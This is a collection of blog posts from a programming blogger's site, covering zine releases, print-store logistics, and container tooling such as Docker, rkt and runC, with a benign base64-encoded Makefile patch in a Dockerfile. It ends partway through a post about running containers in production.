{"url": "https://jvns.ca/blog/2022/05/10/pages-that-didn-t-make-it-into--how-dns-works-/", "title": "Pages that didn't make it into \"How DNS Works\"", "content": "\n     \n\n Hello! A couple weeks ago I released a new zine called  How DNS Works . \n\n When I started writing that zine (in, uh, January 2021), I originally had in\nmind a broader zine on “everything you need to know to own a domain”. So it had\na bunch of pages on domain registration, TLS, and email. \n\n At the time I thought “I can just explain DNS in like 5 pages, it’s not\nthat complicated, there will be lots of space for other topics about domains”.\nI was extremely wrong about that and it turned out I needed all 28 pages to\nexplain DNS. So I ended up deciding to just focus the zine on DNS and all those\nother topics didn’t make it into the final zine. \n\n This morning it occurred to me that instead of letting all of the old draft\npages languish in purgatory on my hard drive, I could post those extra pages\nhere all together on my blog. So here they are! \n\n disclaimer: not super cohesive \n\n I will say (as a disclaimer) that these pages aren’t as cohesive as I usually\nlike my zines to be and they definitely do not tell you everything you need to\nneed to know to own a domain. \n\n domain registration \n\n \n \n \n \n \n \n\n email \n\n \n \n\n I should say that these 2 pages don’t really do email justice – email security\nis a HUGE topic that honestly I don’t know a lot about. \n\n TLS \n\n \n \n\n These two pages also don’t remotely cover TLS, it’s possible I’ll write more in\ndepth about TLS at some point. Who knows! \n\n that’s all! \n\n though I will say: if you liked these, you might be interested in buying  How DNS Works  :) \n\n"},
{"url": "https://jvns.ca/blog/2021/06/02/you-can-now-buy-print-version-of-my-zines-/", "title": "You can now buy print version of my zines!", "content": "\n     \n\n Hello! Quick announcement: I opened a new  print zine\nstore  last week, so now you can buy print\ncopies of my zines! To start I’ve printed 350 copies of each of the “Bite\nSize…” zines. \n\n Here’s a photo of the front of the zines and some stickers: \n\n \n \n \n\n and the back covers:\n \n \n \n\n Here are some notes about how the store works: \n\n great print quality! \n\n I worked with a really good print company ( Girlie Press ) and printed the zines on some nice paper,\nso they look WAY nicer than they do when printed on a home printer :). I’m\ndelighted with how they turned out. \n\n When I originally started working on this project I thought about using a\nprint-on-demand company briefly (it sounds so convenient!) but I ordered test\nprints from all the ones I could find and it turns out that none of them could\nproduce the print quality I wanted. \n\n free shipping! \n\n I never like paying for shipping, so I’ve set up free shipping for US orders\nover $30, and international orders over $50. \n\n All of the shipping is being managed by a delightful small company called\n White Squirrel  near Seattle, who specialize in\nshipping for artists. (I’m not handling it myself because I am extremely\nforgetful and I would just get distracted and forget to ship your order,\neverybody would suffer) \n\n stickers! \n\n I’ve also added also some stickers on the store as a bonus – there’s an strace\nsticker because of my great love for strace, a TCP witch (from the cover of\n let’s learn tcpdump ), and a REALLY CUTE space penguin who I’m personally obsessed with from the cover of\n how containers work . \n\n If you order the pack of all 4 zines, you’ll get all of the stickers as well as\na sticker sheet of the cover of Bite Size Command Line, so you can have awk and\ngrep stickers :) \n\n a discount if you already bought the PDF version! \n\n If you already bought the PDF version of these zines – thank you so much!! You\ncan use the PASTBUYER discount code for 40% off. You’ll need to use the same\nemail address you used when you bought the PDF. If you run into any problems\nwith that, email me at julia@wizardzines.com. \n\n all print zines include the PDF version too! \n\n If you order the print version and you don’t already have the PDF version –\nit’s included! You’ll get a link with your confirmation email that’ll let you\ndownload the PDF right away. \n\n more zines coming soon! \n\n Right now only 4 zines (the “Bite Size…”  zines) are available on this store\nbecause I wasn’t sure how many to order and didn’t want to end up with\nthousands of zines in a warehouse by accident (think of the trees!). \n\n But I’ll definitely be adding more zines relatively soon! \n\n hopefully also bulk rates and posters \n\n I’m hoping to add bulk rates soon – like if you want to buy 10 copies of a\nzine for everyone on team, 30 copies for a class, or 100 copies as swag for a\nconference. \n\n I’d also like to add some posters to the store at some point, like a\n how to be a wizard programmer  poster. \n\n All of that is coming later though! Sales have been going pretty well so far\n(we’ve sold almost half of the initial print run!), so thank you ❤. \n\n the link again \n\n The print zines ore at  https://store.wizardzines.com , or you can find it linked from each zine’s page at  https://wizardzines.com/zines/bite-size-bash  (click on “print version”) \n\n"},
{"url": "https://jvns.ca/blog/2021/10/02/all-my-zines-are-now-available-in-print/", "title": "All my zines are now available in print!", "content": "\n     \n\n Hello!  In June I announced  that I was releasing 4 zines in print and promised “more zines\ncoming soon”. “Soon” has arrived! You can get any zine you want in print now! \n\n I’m doing this now so that you can get zines in the mail in time for Christmas, or\nany other end-of-year holiday you celebrate :) \n\n you can preorder zines today! \n\n First the basic facts! \n\n \n you can preorder zines as of today \n the preorder deadline is October 12 \n zines will ship around November 5 \n you’ll get them in time for Christmas \n more logistical details in the  Preorders FAQ \n \n\n Here’s the link to get them: \n\n \n Preorder print zines \n \n\n \n\n Here are a few more notes about how the print zines work – they’re mostly the same as  last time \n\n why a preorder? \n\n It makes it easier to decide how many zines to print! I don’t want to\naccidentally underestimate demand and then not have enough zines for everyone\nwho wants them. With a preorder, everyone can get all the zines they want! \n\n great print quality! \n\n I’m working with the same wonderful print company again to print the zines ( Girlie Press ).  I don’t have photos of the new\nzines yet, but here are some photos from people who received the last batch of\nzines: \n\n (these are all Twitter embeds so they probably won’t work if you’re reading this an email / RSS feed) \n\n I got by mail these\nbeautiful zines and stickers made by  @b0rk . Certainly the\npics don't make justice to the impressive quality of the paper and the\nprint. I hope more zines get the print version!  pic.twitter.com/mdoEtlZPe7 —\nRaymundo Cassani (@r_cassani)  June\n24, 2021   \n\n Received my Bite Size books and stickers from  @b0rk  today! They are beautiful!  #linux   #bash   #networking   pic.twitter.com/AkCKnOQ7bO — Paul Mora (@pmora_ttc)  June 7, 2021   \n\n Got my Bite Size collection from  @b0rk ! 😍 Really appreciate this work, and the zines look amazing!  pic.twitter.com/x7DZyWpwJP — Luana (@lnplgv)  June 23, 2021   \n\n inspired by  @b0rk ,  @actuallysoham  and i made a zine for  @mnwsth ’s OS course and  @b0rk  graciously sent us some of her own zines and stickers! here’s to making programming concepts more accessible!  pic.twitter.com/otKDglh3gV — Tanvi Roy (@actuallytanvi)  August 15, 2021   \n\n free shipping! \n\n I never like paying for shipping, so I’ve set up free shipping for US orders\nover $30, and international orders over $50. \n\n All of the shipping is being managed by a delightful small company called\n White Squirrel  near Seattle, who specialize in\nshipping for artists. They’ve been a joy to work with for the last 4 months. \n\n a discount if you already bought the PDF version! \n\n If you already bought the PDF version of these zines – thank you so much!! You\ncan use the  PDFBUYER  discount code for 50% off the print version. You’ll\nneed to use the same email address you used when you bought the PDF. If you run\ninto any problems with that, email me at julia@wizardzines.com. \n\n all print zines include the PDF version too! \n\n If you order the print version and you don’t already have the PDF version –\nit’s included! You’ll get a link with your confirmation email that’ll let you\ndownload the PDF right away. \n\n discounts for buying zines in bulk! \n\n If you want to buy your team zines for Christmas, there’s a 20% discount for\norders over $300. Just use code  TEAMZINES . \n\n (this is the other thing that I said was “coming soon” last time :)) \n\n how to get my free zines in print: Your Linux Toolbox \n\n You might notice that  https://store.wizardzines.com  doesn’t have print versions\nof my free zines (like “Networking! ACK!” or “So you want to be a wizard”). You\ncan get those by buying the “Your Linux Toolbox” box set,  this blog post has\nlinks to where to get it . \n\n (if you’re wondering why Your Linux Toolbox is so much cheaper than the other\nprint zines for sale: it’s pretty simple, it’s because I basically don’t make any money from it :). But it’s\ngreat – I love the box!! – and you should order it if you want my free zines in print!) \n\n \nI’d love to be able to print a similar box for my other zines, but I haven’t\nfound a company that will do it yet! Maybe one day!\n \n\n working with small businesses that are close to each other is great \n\n When I was originally thinking about how to ship, I considered getting the\nzines printed in China because it’s cheaper and that’s what a lot of publishers\ndo. \n\n Instead I decided to use a print company (Girlie Press) that’s in the same area as the company\nthat handles my shipping (the Seattle area). I’m really happy with this choice\neven though it’s a bit more expensive because: \n\n \n The turnaround time is WAY faster – I can email them and get new zines\nprinted and shipped to the warehouse super quickly. Which means that even if\nI do a preorder, people don’t actually have to wait that long to get their\nzines. \n Small businesses in general seem more flexible and easier to work with\n– for example a big fulfillment company I was considering told me that for\nthem to ship stickers for me, every sticker needed to be individually\nbarcoded. And they warned me not to ship them stickers shrink wrapped,\nbecause they might accidentally decide that 500 stickers is a single item\nand ship all 500 to one person. That kind of ridiculous mistake is a lot\nless likely to happen with a small business :) \n \n\n \n.button2 {\n    background-color: #ff5e00;\n    display: inline-block;\n    color: white;\n    margin-bottom: 6px;\n    font-weight: normal;\n    text-align: center;\n    vertical-align: middle;\n    touch-action: manipulation;\n    cursor: pointer;\n    background-image: none;\n    border: 1px solid transparent;\n    white-space: nowrap;\n    padding: 3px 6px;\n    font-size: 16px;\n    line-height: 1.7;\n    border-radius: 2px;\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    -ms-user-select: none;\n    user-select: none;\n    align-self: flex-end;\n}\n \n\n"},
{"url": "https://jvns.ca/blog/2016/09/15/whats-up-with-containers-docker-and-rkt/", "title": "Some questions about Docker and rkt", "content": "\n     \n\n Hello! I have been thinking about containers at work. I’m going to talk about\nrunning containers in production! I’ve talked before about how\n using Docker for development is great ,\nbut that’s not what this post is about. Using docker in development seems really great and fine and I have no problems with it. \n\n However I have VERY MANY QUESTIONS about running Docker in production. As a\npreface – I have never run containers in production. You should not take\nadvice from me. So far reading about containers mostly feels like  this hilarious article . \n\n So: your setting is, you have a server, and you want to run programs on that\nserver. In containers, maybe! Should you use Docker? I have no idea! Let’s\ntalk about what we do know, though. \n\n If you want to know what containers are, you could read  You Could Have Invented Container Runtimes: An Explanatory Fantasy \n\n reasons to use containers \n\n packaging . Let’s imagine you want to run your application on a computer. Your application depends on some weird JSON library being installed. \n\n Installing stuff on computers so you can run your program on them really\nsucks. It’s easy to get wrong! It’s scary when you make changes! Even if you\nuse Puppet or Chef or something to install the stuff on the computers, it\nsucks. \n\n Containers are nice, because you can install all the stuff your program needs to run in the container  inside the container . \n\n packaging is a huge deal and it is probably the thing that is most interesting to me about containers right now \n\n scheduling . $$$. Computers are expensive. If you have custom magical computers that are all set up differently, it’s hard to move your programs from running on Computer 1 to running on Computer 2. If you use containers, you can make your computers all the same! Then you can more easily pack your programs onto computers in a more reasonable way. Systems like Kubernetes do this automagically but we are not going to talk about Kubernetes. \n\n better developer environment . If you can make your application run in a container, then maybe you can also develop it on your laptop in the same container? Maybe? I don’t really know much about this. \n\n security . You can use seccomp-bpf or something to restrict which system calls your program runs?  sandstorm  does stuff like this. I don’t really know. \n\n There are probably more reasons that I’ve forgotten right now. \n\n ok so what’s up with the Docker daemon \n\n Docker has a daemon. Here is an architecture diagram that I shamelessly stole from  this article \n\n \n\n Usually I run programs on my computers. With Docker, you have to run a magical “docker daemon” that handles all my containers. Why? I don’t know! I don’t understand what the Docker daemon is for. With rkt, you just run a process. \n\n People have been telling me stories that sometimes if you do the Wrong\nThing and the Docker daemon has a bug, then the daemon can get deadlocked and\nthen you have to kill it and all your containers die. I assume they work\npretty hard on fixing these bugs, but I don’t  want  to have to trust that\nthe Docker daemon has no bugs that will affect me. All software has bugs! \n\n If you treat your container more like a process, then you can just run it,\nsupervise it with supervisord or upstart or whatever your favorite way to\nsupervise a process is. I know what a process is! I understand processes, kind\nof. Also I already use supervisord so I believe in that. \n\n So that kind of makes me want to run rkt, even though it is a Newer Thing. \n\n PID 1 \n\n My coworker told me a very surprising thing about containers. If you run just one process in a container, then it apparently gets PID 1? PID 1 is a pretty exciting process. Usually on your computer,  init  gets PID 1. In particular, if another container process gets orphaned, then it suddenly magically becomes a child of PID 1. \n\n So this is kind of weird, right? You don’t want your process to get random zombie processes as children. Like that might be fine, but it violates a lot of normal Unix assumptions about what normally happens to normal processes. \n\n I think “violates a lot of normal Unix assumptions about what normally happens to normal processes” is basically the whole story about containers. \n\n Yelp made a solution to this called  dumb-init . It’s kind of interesting. \n\n networking \n\n I wrote a pretty bad blog post about container networking a while back. It can\nbe really complicated! There are these “network namespaces” that I don’t\nreally understand, and you need to do port forwarding, and why? \n\n Do you really need to use this complicated container networking stuff? I kind\nof just want to run container processes and run them on normal ports in my\nnormal network namespace and leave it at that. Is that wrong? \n\n secrets \n\n Often applications need to have passwords and things! Like to databases! How do you get the passwords into your container? This is a pretty big problem that I’m not going to go into now but I wanted to ask the question. (I know there are things like vault by hashicorp. Is using that a good idea? I don’t know!) \n\n creating container images \n\n To run containers, you need to create container images! There seem to be two main formats: Docker’s format and rkt’s format. I know nothing about either of them. \n\n One nice thing is that rkt can run Docker containers images. So you could use Docker’s tools to make a container but then run it without using Docker. \n\n There are at least 2 ways to make a Docker image: using a Dockerfile and  packer . Packer lets you provision a container with Puppet or Chef! That’s kind of useful. \n\n so many questions \n\n From the few (maybe 5?) people I’ve talked to about containers so far, the overall consensus seems to be that they’re a pretty useful thing, despite all the hype, but that there are a lot of sharp edges and unexpected things that you’ll have to make your way through. \n\n Good thing we can all learn on the internet together. \n\n"},
{"url": "https://jvns.ca/blog/2023/02/11/print-copies-of-the-pocket-guide-to-debugging-have-arrived/", "title": "Print copies of The Pocket Guide to Debugging have arrived", "content": "\n     \n\n Hello! We  released The Pocket Guide to Debugging  back in December, and here’s a final update: the print copies are done printing and they’ve arrived at the warehouse, ready to ship to anyone who wants one. \n\n You can  buy the print or PDF version  now, and if you preordered it, your copy should already have shipped. Some people have told me that they already received theirs! Email me if you haven’t gotten the shipping confirmation. \n\n some pictures \n\n Here are some photos of what the print version looks like: \n\n \n \n\n what was involved in printing it \n\n In case anyone is interested, here’s what was involved in putting together the print version: \n\n \n Make a PDF copy that people can print on their home printer (with a 360-line Python program) \n Test on my home printer that the “print at home version” prints properly \n Release the “print at home” version (this was back in December) \n Take a couple of weeks off, since it’s the end of the year \n Ask the illustrator to make a back cover \n Get a quote from the print company \n Agonize a bit over whether to print the zine as perfect bound or saddle stitched (stapled). Pick perfect bound. \n Find out from the print company how wide the spine has to be \n With the help of the illustrator, make a design for the spine. \n Get an ISBN number (just a couple of clicks at  Libraries and Archives Canada ) \n Get a bar code for the ISBN (from  bookow ), edit it to make it a little smaller, and put it on the back cover \n Send the new PDF to the print company and request a print proof \n Wait a week or so for the proof to get shipped across the continent \n Once the proof arrives, realize that the inner margins are too small, because it was perfect bound and perfect bound books need bigger margins (We’d already tried to account for that, but we didn’t make them big enough) \n Measure various books I have around the house and print some new sample pages to figure out the right margins \n Painstakingly manually readjust every single page to have slightly different proportions, so that I can increase the margins \n Edit the Python script to make a new PDF with the bigger margins \n Send the final files to the print company \n Wait a week for them to print 1500 copies \n The print copies arrive at the warehouse! \n Wait another 3 business days for the (amazing) folks who do the shipping to send out all 700 or so preorders \n Success! \n \n\n Printing 1500 copies of something is always a little scary, but I’m really\nhappy with how it turned out. \n\n thanks so much to everyone who preordered! \n\n If you preordered the print version, thanks so much for your patience – having\nthe preorders really helps me decide how many to print. \n\n And please let me know if something went wrong – 1 or 2 packages always get\nlost in the mail and while I can’t help find them, it’s very easy for me to\njust ship you another one :) \n\n"},
{"url": "https://jvns.ca/blog/2015/11/09/docker-is-amazing/", "title": "Docker is amazing", "content": "\n      I didn’t really understand what Docker was  for  until yesterday. I mean, containers. Cool. Whatever. \n\n Yesterday I was trying to get an environment for some neural networks experiments (exciting post upcoming featuring THE QUEEN!). And it was, well, horrible. I needed Ubuntu 14.04, and I thought I was going to have reinstall my operating system, and I am apparently past the age when that was fun. I needed all these C++ things and nothing was working and I did not know what to do. \n\n AND THEN I REMEMBERED ABOUT DOCKER. \n\n I downloaded an Ubuntu 14.04 image, and suddenly I just had Ubuntu 14.04! And I could INSTALL THINGS ON IT. Without worrying! And if I put them in a Dockerfile, it would let OTHER PEOPLE set up the same environment. Whoa. \n\n And it’s fast! It’s not like a virtual machine which takes forever to start – starting a Docker container is just like, well, starting a program. Fast. Now I can run all my experiments inside the container and it’s not a problem. \n\n Here’s what the Dockerfile looks like!  It was really easy! I just do the same random crap I might do to set up my environment normally (do you see where I install some packages, and then replace the sources.list from, uh, Debian wheezy, with an Ubuntu sources.list in the middle? yeah I did that.). But I don’t have to worry about screwing up my computer while doing it, and then even if it’s a mess, it’s a  reproducible  mess! \n\n It includes the following gem:\n \nRUN cd /opt/caffe  \n   && cp Makefile.config.example Makefile.config  \n   && echo LS0tIE1ha2VmaWxlLmNvbmZpZy5leGFtcGxlCTIwMTUtMTEtMDcgMTU6NDU6MTIuNTEzNjQ3ODc2IC0wNTAwCisrKyBNYWtlZmlsZS5jb25maWcJMjAxNS0xMS0wOCAyMDozODoyMi4xMDcwNTA2MDggLTA1MDAKQEAgLTUsNyArNSw3IEBACiAjIFVTRV9DVUROTiA6PSAxCiAKICMgQ1BVLW9ubHkgc3dpdGNoICh1bmNvbW1lbnQgdG8gYnVpbGQgd2l0aG91dCBHUFUgc3VwcG9ydCkuCi0jIENQVV9PTkxZIDo9IDEKK0NQVV9PTkxZIDo9IDEKIAogIyB1bmNvbW1lbnQgdG8gZGlzYWJsZSBJTyBkZXBlbmRlbmNpZXMgYW5kIGNvcnJlc3BvbmRpbmcgZGF0YSBsYXllcnMKICMgVVNFX09QRU5DViA6PSAwCkBAIC02NSwxNCArNjUsMTQgQEAKIAkJL3Vzci9saWIvcHl0aG9uMi43L2Rpc3QtcGFja2FnZXMvbnVtcHkvY29yZS9pbmNsdWRlCiAjIEFuYWNvbmRhIFB5dGhvbiBkaXN0cmlidXRpb24gaXMgcXVpdGUgcG9wdWxhci4gSW5jbHVkZSBwYXRoOgogIyBWZXJpZnkgYW5hY29uZGEgbG9jYXRpb24sIHNvbWV0aW1lcyBpdCdzIGluIHJvb3QuCi0jIEFOQUNPTkRBX0hPTUUgOj0gJChIT01FKS9hbmFjb25kYQotIyBQWVRIT05fSU5DTFVERSA6PSAkKEFOQUNPTkRBX0hPTUUpL2luY2x1ZGUgXAotCQkjICQoQU5BQ09OREFfSE9NRSkvaW5jbHVkZS9weXRob24yLjcgXAotCQkjICQoQU5BQ09OREFfSE9NRSkvbGliL3B5dGhvbjIuNy9zaXRlLXBhY2thZ2VzL251bXB5L2NvcmUvaW5jbHVkZSBcCitBTkFDT05EQV9IT01FIDo9IC9vcHQvY29uZGEKK1BZVEhPTl9JTkNMVURFIDo9ICQoQU5BQ09OREFfSE9NRSkvaW5jbHVkZSBcCisJCSAkKEFOQUNPTkRBX0hPTUUpL2luY2x1ZGUvcHl0aG9uMi43IFwKKwkJICQoQU5BQ09OREFfSE9NRSkvbGliL3B5dGhvbjIuNy9zaXRlLXBhY2thZ2VzL251bXB5L2NvcmUvaW5jbHVkZSBcCiAKICMgV2UgbmVlZCB0byBiZSBhYmxlIHRvIGZpbmQgbGlicHl0aG9uWC5YLnNvIG9yIC5keWxpYi4KIFBZVEhPTl9MSUIgOj0gL3Vzci9saWIKLSMgUFlUSE9OX0xJQiA6PSAkKEFOQUNPTkRBX0hPTUUpL2xpYgorUFlUSE9OX0xJQiA6PSAkKEFOQUNPTkRBX0hPTUUpL2xpYgogCiAjIEhvbWVicmV3IGluc3RhbGxzIG51bXB5IGluIGEgbm9uIHN0YW5kYXJkIHBhdGggKGtlZyBvbmx5KQogIyBQWVRIT05fSU5DTFVERSArPSAkKGRpciAkKHNoZWxsIHB5dGhvbiAtYyAnaW1wb3J0IG51bXB5LmNvcmU7IHByaW50KG51bXB5LmNvcmUuX19maWxlX18pJykpL2luY2x1ZGUK  \n   | base64 -d \\\n   | patch -u Makefile.config\n \n\n where I edited a file manually, made a patch, base64 encoded it, and just pasted the string into the Dockerfile so that the edits I needed would work. \n\n The next time I need to compile a thing with horrible dependencies that I don’t have on my computer and that conflict with everything, I’m totally using Docker. \n\n"},
{"url": "https://jvns.ca/blog/2023/06/23/new-zine--how-integers-and-floats-work/", "title": "New zine: How Integers and Floats Work", "content": "\n     \n\n Hello! On Wednesday, we released a new zine:  How Integers and Floats Work ! \n\n You can get it for $12 here:\n https://wizardzines.com/zines/integers-floats , or get\nan  13-pack of all my zines here . \n\n Here’s the cover: \n\n \n \n \n\n the table of contents \n\n Here’s the table of contents! \n\n \n   \n\n Now let’s talk about some of the motivations for writing this zine! \n\n motivation 1: demystify binary \n\n I wrote this zine because I used to find binary data really impenetrable. There\nare all these 0s and 1s! What does it mean? \n\n But if you look at any binary file format, most of it is integers! For example,\nif you look at the DNS parsing in  Implement DNS in a Weekend , it’s all about encoding and\ndecoding a bunch of integers (plus some ASCII strings, which arguably are also arrays of integers). \n\n So I think that learning how integers work in depth is a really nice way to get\nstarted with understanding binary file formats. The zine also talks about some\nother tricks for encoding binary data into integers with binary operations and\nbit flags. \n\n motivation 2: explain floating point \n\n The second motivation was to explain floating point. Floating point is pretty\nweird! (see [examples of floating point problems]()\nfor a very long list) \n\n And almost all explanations of floating point I’ve read have been really math\nand notation heavy in a way that I find pretty unpleasant and confusing, even\nthough I love math more than most people (I did a pure math degree) and am\npretty good at it. \n\n We spent weeks working on a clearer explanation of floating point with minimal\nmath jargon and lots of pictures and I think we got there. Here’s one example page, on\nthe floating point number line: \n\n \n\n it comes with a playground: memory spy! \n\n One of my favourite ways to learn about how my computer represents things in\nmemory has been to use a debugger to look at the memory of a real program. \n\n But C debuggers like gdb are pretty hard to use at first! So\n Marie  and I made a playground called  Memory Spy . It runs a C debugger behind the\nscenes, but it provides a much simpler interface – there are a bunch of\nvery simple example C programs, and you can just click on each line to view how\nthe variable on that line is represented in memory. \n\n Here’s a screenshot: \n\n \n \n \n\n Memory Spy is inspired by Philip Guo’s great  Python Tutor . \n\n float.exposed is great \n\n When doing demos and research for this zine, I found myself reaching for\n float.exposed  a lot to show how numbers are encoded\nin floating point. It’s by  Bartosz Ciechanowski , who has tons of other great visualizations on his site. \n\n I loved it so much that I made a clone called  integer.exposed  for\nintegers (with permission), so that people could look at integers in a similar way. \n\n some blog posts I wrote along the way \n\n Here are a few blog posts I wrote while thinking about how to write this zine: \n\n \n examples of floating point problems \n examples of problems with integers \n some possible reasons for 8-bit bytes \n \n\n you can get a print copy shipped to you! \n\n There’s always been the option to print the zines yourself on your home\nprinter. \n\n But this time there’s a new option too: you can get a print copy shipped to\nyou! (just click on the “print version” link on  this page ) \n\n The only caveat is print orders will ship in  August  – I\nneed to wait for orders to come in to get an idea of how many I should print\nbefore sending it to the printer. \n\n people who helped with this zine \n\n I don’t make these zines by myself! \n\n I worked with  Marie LeBlanc Flanagan  every\nmorning for 5 months to clarify explanations and build  memory spy . \n\n The cover is by Vladimir Kašiković, Gersande La Flèche did copy editing, Dolly\nLanuza did editing, another friend did technical review. \n\n Stefan Karpinski  gave a talk 10 years ago at the Recurse Center (I even  blogged about it at the time )\nwhich was the first explanation of floating point that ever made any sense to\nme. He also explained how signed integers work to me in a Mastodon post a few\nmonths ago, when I was in the middle of writing the zine. \n\n And finally, I want to thank all the beta readers – 60 of you read the zine and left\ncomments about what was confusing, what was working, and ideas for how to make\nit better. It made the end product so much better. \n\n thank you \n\n As always: if you’ve bought zines in the past, thank you for all your support\nover the years. I couldn’t do this without you. \n\n"},
{"url": "https://jvns.ca/blog/2016/10/02/a-list-of-container-software/", "title": "A list of Linux container software", "content": "\n      I have been confused about the plethora of container software in the world. This is a\nlist, mostly to remind myself that there is a lot of software and so it is not surprising\nthat I do not understand what it all is yet. \n\n I’ve tried to restrict this to just “software that you might reasonably want to\nuse/consider/understand when running containers in production”. My rough heuristic for\nthis is just “software someone has told me about more than once, and is not experimental”.\nObviously some of these things are more important than others. \n\n Having written this down, I feel a bit better – there are only 17 pieces of software on\nthis list, from 6 different organizations. That’s actually less than I felt like it was\nand I kinda sorta know what all of these things do. \n\n The major organizations writing open source software to help people run containers on\nLinux seem to be (alphabetically): Canonical, CoreOS, Docker, Google, HashiCorp, Mesosphere, Red Hat, and OCI (cross-company foundation). \n\n I’ve tried to summarize each one in 3 words or less which is hard because a lot of this\nsoftware has a lot of different jobs. \n\n \n docker stuff\n\n \n docker \n containerd  (process supervisor) \n docker swarm  (orchestration) \n \n Kubernetes stuff\n\n \n kubernetes  (orchestration, has many components) \n \n Mesosphere stuff\n\n \n Mesos  (orchestration) \n \n CoreOS stuff\n\n \n CoreOS  (linux distribution) \n rkt   (runs containers) \n flannel  (network overlay) \n etcd  (key-value store) \n \n HashiCorp stuff\n\n \n consul  (key-value store, service discovery) \n packer  (creates containers) \n vault  (secrets management) \n nomad  (orchestration) \n \n OCI (open container initiative) stuff\n\n \n runC  (runs containers) \n libcontainer  (donated by Docker, powers runC) \n \n systemd-nspawn ( man page ) (starts containers) \n dumb-init  (init process) \n LXC  (runs containers, from Canonical) \n \n\n There are also a bunch of container registries you can pay for, like  quay (from CoreOS) ,  google’s one ,  docker trusted registry , etc. \n\n I’ve probably missed at least one important organization / piece of software here. As\nusual you can tell me about it  on twitter . \n\n"},
{"url": "https://jvns.ca/blog/2016/10/02/i-just-want-to-run-a-container/", "title": "\"I just want to run a container!\"", "content": "\n     \n\n I wrote  “what’s up with containers: Docker and rkt” \na while ago. Since then I have learned a few new things about containers! We’re going to\ntalk about running containers in production, not on your laptop for development, since I’m\ntrying to understand how that works in September 2016. It’s worth noting that all this\nstuff is moving pretty fast right now. \n\n The concerns when you run containers in production are pretty different from running it on a laptop – I  very happily  use Docker on my laptop and I have no real concerns about it because I don’t care much if processes on my laptop crash like 0.5% of the time, and I haven’t seen any problems. \n\n Here are the things I’ve learned so far. I learned many of these things with\n @grepory  who is the best. Basically I want to talk about what some of the things you need to think about are\nif you want to run containers, and what is involved in “just running a container” :) \n\n At the end I’m going to come back to a short discussion of Docker’s current architecture. (tl;dr:\n @jpetazzo  wrote a  really awesome gist ) \n\n Docker is too complicated! I just want to run a container \n\n So, I saw this image online! (comes from  this article )\n \n\n And I thought “that rkt diagram looks way easier to operate in production! That’s what I\nwant!” \n\n Okay, sure! No problem. I can use  runC ! Go to  runc.io , follow the\ndirection, make a  config.json  file, extract my container into a tarball, and now I can\nrun my container with a single command. Awesome. \n\n Actually I want to run 50 containers on the same machine. \n\n Oh, okay, that’s pretty different. So – let’s say all my 50 containers share a bunch of\nfiles (shared libraries like libc, Ruby gems, a base operating system, etc.). It would be\nnice if I could load all those files into memory just once, instead of 3 times. \n\n If I did this I could save disk space on my machine (by just storing the files once), but\nmore importantly, I could save memory! \n\n If I’m running 50 containers I don’t want to have 50 copies of all my shared libraries in\nmemory. That’s why we invented dynamic linking! \n\n If you’re running just 2-3 containers, maybe you don’t care about a little bit of copying.\nThat’s for you to decide! \n\n It turns out that the way Docker solves this is with “overlay filesystems” or\n“graphdrivers”. (why are they called graphdrivers? Maybe because different layers depend on each other like in a directed graph?) These let you stack\nfilesystems – you start with a base filesystem (like Ubuntu 14.04) and then you can start\nadding more files on top of it one step at a time. \n\n Filesystem overlays need some Linux kernel support to work – you need to use a filesystem that supports them.  The Brutally Honest Guide to Docker Graphdrivers  by the fantastic Jessie Frazelle has a quick overview. overlayfs seems to be the most normal option. \n\n At this point, I was running Ubuntu 14.04. 14.04 runs a 3.13 Linux kernel! But to use overlayfs, you need a 3.18 kernel! So you need to upgrade your kernel. That’s fine. \n\n Back to  runC .  runC   does not support overlay filesystems . This is an intentional design choice – it lets runC run on older kernels, and lets you separate out the concerns. But it’s not super obvious right now how to use runC with overlay filesystems. So what do I do? \n\n I’m going to use rkt to get overlay filesystem support \n\n So! I’ve decided I want overlay filesystem support, and gotten a Linux kernel newer than\n3.18. Awesome. Let’s try rkt, like in that diagram! It lives at\n coreos.com/rkt/ \n\n If you download  rkt  and run  rkt run docker://my-docker-registry/container , This\ntotally works. Two small things I learned: \n\n --net=host  will let you run in the host network namespace \n\n Network namespaces are one of the most important things in container land. But if you want to run containers using as few new things as possible, you can start out by just running your containers as normal programs that run on normal ports, like any other program on your computer. Cool \n\n --exec=/my/cool/program  lets you set which command you want rkt to execute inside the image \n\n systemd : rkt will run a program called  systemd-nspawn  as the init (PID 1) process inside your container. This is because  it can be bad to run an arbitrary process as PID 1  – your process isn’t expecting it and will might react badly. It also run some systemd-journal process? I don’t know what that’s for yet. \n\n The systemd journal process might act as a syslog for your container, so that programs sending logs through syslog end up actually sending them somewhere. \n\n There is quite a lot more to know about rkt but I don’t know most of it yet. \n\n I’d like to trust that the code I’m running is actually my code \n\n So, security is important. Let’s say I have a container registry. I’d like to make sure\nthat the code I’m running from that registry is actually trusted code that I built. \n\n Docker lets you sign images to verify where they came from. rkt lets you run Docker\nimages. rkt does not let you check signatures from Docker images though! This is bad. \n\n You can fix this by setting up your own rkt registry. Or maybe other things! I’m going to\nleave that here. At this point you probably have to stop using Docker containers though and convert them to a different format. \n\n Supervising my containers (and let’s talk about Docker again) \n\n So, I have this Cool Container System, and I can run containers with overlayfs and I can\ntrust the code I’m running. What now? \n\n Let’s go back to Docker for a bit. So far I’ve been a bit dismissive about Docker, and I’d\nlike to look at its current direction a little more seriously. Jérôme Petazzoni wrote an\nextremely informative and helpful discussion about how Docker got to its architecture\ntoday in  this gist . He says (which I think is super true) that Docker’s approach to date has done a huge amount to drive container adoption and let us try out different approaches today. \n\n The end of that gist is a really good starting point for talking about how “start new containers” should work. \n\n Jérôme very correctly says that if you’re going to run containers, you need a way to\ntell boxes which containers to run, and supervise and restart containers when they die. You could supervise them with daemontools,\nsupervisord, upstart, or systemd, or something else! \n\n “Tell boxes which containers to run” is another nontrivial problem and I’m not going to\ntalk about it at all here. So, back to supervision. \n\n Let’s say you use systemd. Then that’ll look like (from the diagram I posted at the top): \n\n - systemd -+- rkt -+- process of container X\n           |       \\- other process of container X\n           +- rkt --- process of container Y\n           \\- rkt --- process of container Z\n \n\n I don’t know anything about systemd, but it’s pretty straightforward to tell daemontools\n“hey, here’s a new process to start running, it’s going to run a container”. Then\ndaemontools will restart that container process if it crashes. So this is basically fine. \n\n My understanding of the problem with Docker in production historically is that – the\nprocess that is responsible for this core functionality of process supervision was the\nDocker engine, but it also had a lot of other features that you don’t necessarily want\nrunning in production. \n\n The way Docker seems to be going in the future is something like: (this diagram is from jpetazzo’s gist above) \n\n - init - containerd -+- shim for container X -+- process of container X\n         |                        \\- other process of container X\n                     +- shim for container Y --- process of container 